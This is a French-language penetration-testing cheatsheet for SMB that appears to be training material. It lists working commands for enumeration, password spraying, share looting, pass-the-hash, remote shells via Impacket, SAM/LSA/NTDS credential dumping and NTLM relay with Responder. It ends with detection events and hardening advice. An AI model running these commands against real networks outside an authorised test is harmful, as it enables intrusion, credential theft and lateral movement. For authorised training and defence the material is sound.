# Cheatsheet — SMB (ports 139 / 445)

Énumération et exploitation du partage de fichiers Windows. Cœur des tests internes et des attaques Active Directory.

> ⚠️ **Cadre.** Labs et périmètres autorisés uniquement. L'accès à un partage, même « ouvert », hors convention d'audit est une infraction (art. 323-1).

---

## 1. Rappels

- **SMB** : protocole de partage de fichiers/imprimantes Windows. Aussi appelé **CIFS** (ancienne version).
- **Ports** : `445` (SMB direct sur TCP), `139` (SMB sur NetBIOS). `137/138` UDP = NetBIOS name/datagram.
- **Session nulle (null session)** : connexion sans identifiants. Sur des systèmes anciens/mal configurés, elle permet d'énumérer utilisateurs, groupes, partages.
- **Versions** : SMBv1 (obsolète, dangereux — EternalBlue) → SMBv2 → SMBv3 (chiffré).

---

## 2. Découverte et version

```bash
# Ports + scripts SMB nmap
nmap -p139,445 --script smb-os-discovery,smb-security-mode,smb-protocols 10.0.0.10

# Version et signature (signing) — clé pour le relais NTLM
nmap -p445 --script smb2-security-mode,smb2-capabilities 10.0.0.10
```

À relever : **version OS**, **SMBv1 activé ?**, **signature exigée ?** (si non → relais NTLM possible).

---

## 3. Énumération — l'outil couteau suisse : NetExec

`nxc` (ex-CrackMapExec) — le standard actuel.

```bash
# Info hôte (nom, domaine, version, signing, SMBv1)
nxc smb 10.0.0.0/24

# Session nulle / utilisateur anonyme
nxc smb 10.0.0.10 -u '' -p ''
nxc smb 10.0.0.10 -u 'guest' -p ''

# Avec identifiants : lister les partages
nxc smb 10.0.0.10 -u user -p 'Passw0rd' --shares

# Énumérations classiques
nxc smb 10.0.0.10 -u user -p pass --users        # comptes du domaine
nxc smb 10.0.0.10 -u user -p pass --groups
nxc smb 10.0.0.10 -u user -p pass --pass-pol      # politique de mot de passe
nxc smb 10.0.0.10 -u user -p pass --sessions
nxc smb 10.0.0.10 -u user -p pass --loggedon-users
nxc smb 10.0.0.10 -u user -p pass --rid-brute     # énumération par RID
```

**Spray & réutilisation** (test interne) :
```bash
# Un mot de passe sur une liste de comptes (attention au verrouillage)
nxc smb 10.0.0.10 -u users.txt -p 'Automne2026!' --continue-on-success

# Balayer un /24 avec un couple valide → où suis-je admin local ? (Pwn3d!)
nxc smb 10.0.0.0/24 -u user -p pass
```

---

## 4. Énumération — autres outils

```bash
# enum4linux-ng : synthèse complète (users, groupes, partages, pol)
enum4linux-ng -A 10.0.0.10

# smbclient : lister les partages
smbclient -L //10.0.0.10 -N              # -N = session nulle
smbclient -L //10.0.0.10 -U 'user%pass'

# rpcclient : requêtes RPC via session nulle
rpcclient -U '' -N 10.0.0.10
  > enumdomusers
  > querydominfo
  > enumdomgroups

# smbmap : vue des partages + droits de lecture/écriture
smbmap -H 10.0.0.10 -u user -p pass
smbmap -H 10.0.0.10 -u null -p ''
```

---

## 5. Accéder aux partages et transférer

```bash
# Se connecter à un partage
smbclient //10.0.0.10/Partage -U 'user%pass'
smbclient //10.0.0.10/Public -N

# Dans smbclient
  > ls
  > get fichier.txt
  > put outil.exe
  > mget *              # récupérer en masse
  > recurse ON; prompt OFF; mget *   # aspirer tout un dossier

# Monter le partage dans le système de fichiers
sudo mount -t cifs //10.0.0.10/Partage /mnt/smb -o username=user,password=pass
```

Chasse aux données sensibles dans les partages : mots de passe en clair, scripts, `.kdbx`, `web.config`, sauvegardes.

```bash
# Recherche de secrets dans les partages accessibles (module NetExec)
nxc smb 10.0.0.10 -u user -p pass -M spider_plus
```

---

## 6. Authentification par empreinte (Pass-the-Hash)

Si tu as un hash NTLM (pas le mot de passe) :

```bash
nxc smb 10.0.0.10 -u Administrateur -H <NTLM_hash>
nxc smb 10.0.0.0/24 -u Administrateur -H <hash>   # où ce hash est-il admin ?
```

---

## 7. Exécution de commandes à distance

Une fois admin local sur une machine :

```bash
# Via NetExec (plusieurs méthodes : wmiexec, smbexec, atexec)
nxc smb 10.0.0.10 -u Administrateur -p pass -x "whoami"
nxc smb 10.0.0.10 -u Administrateur -H <hash> -x "ipconfig"

# Impacket — shells semi-interactifs
impacket-psexec  DOMAINE/user:pass@10.0.0.10      # crée un service (bruyant)
impacket-wmiexec DOMAINE/user:pass@10.0.0.10      # via WMI (plus discret)
impacket-smbexec DOMAINE/user:pass@10.0.0.10
impacket-atexec  DOMAINE/user:pass@10.0.0.10 "cmd" # via tâche planifiée

# Récupérer les secrets (SAM/LSA/NTDS)
nxc smb 10.0.0.10 -u Administrateur -H <hash> --sam --lsa
impacket-secretsdump DOMAINE/user:pass@10.0.0.10
```

---

## 8. Relais NTLM (quand la signature n'est pas exigée)

```bash
# 1) Repérer les cibles sans signing
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2) Empoisonner (LLMNR/NBT-NS) pour capter des authentifications
sudo responder -I eth0

# 3) Relayer vers les cibles vulnérables
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

**Remédiation clé** : exiger la **signature SMB**, désactiver **LLMNR/NBT-NS**, retirer **SMBv1**.

---

## 9. EternalBlue (MS17-010) — SMBv1

```bash
nmap -p445 --script smb-vuln-ms17-010 10.0.0.10   # détecter
```
Exploitation : lab uniquement (instable, peut faire écran bleu → jamais en prod). Module Metasploit `ms17_010_eternalblue`.

---

## 10. Côté Blue Team — détection

| Action | Trace |
| --- | --- |
| Énumération / session nulle | Pics de 4624 (type 3), accès partages `IPC$` |
| psexec | Event **7045** (installation de service), Sysmon 1 ; nom de service aléatoire |
| wmiexec / atexec | 4688, création de tâche (4698), activité WMI |
| Pass-the-Hash | 4624 type 3 avec NTLM là où Kerberos est attendu |
| secretsdump / DCSync | 4662 sur l'objet domaine, réplication inattendue |
| Responder / relais | Requêtes LLMNR/NBT-NS anormales, authentifications croisées |

**Durcissement** : signature SMB obligatoire, suppression de SMBv1, désactivation LLMNR/NBT-NS, moindre privilège sur les partages, tiering admin, LAPS (mot de passe admin local unique → casse le PtH latéral).

---

## 11. À savoir expliquer à l'oral

- **Pourquoi 139 et 445 ?** NetBIOS historique vs SMB direct sur TCP.
- **Ce qu'est une session nulle** et pourquoi elle est dangereuse.
- **Pourquoi la signature SMB bloque le relais NTLM.**
- **Pass-the-Hash** : on rejoue l'empreinte sans jamais connaître le mot de passe ; LAPS + tiering cassent le mouvement latéral.
- **Pourquoi retirer SMBv1** (EternalBlue, WannaCry).
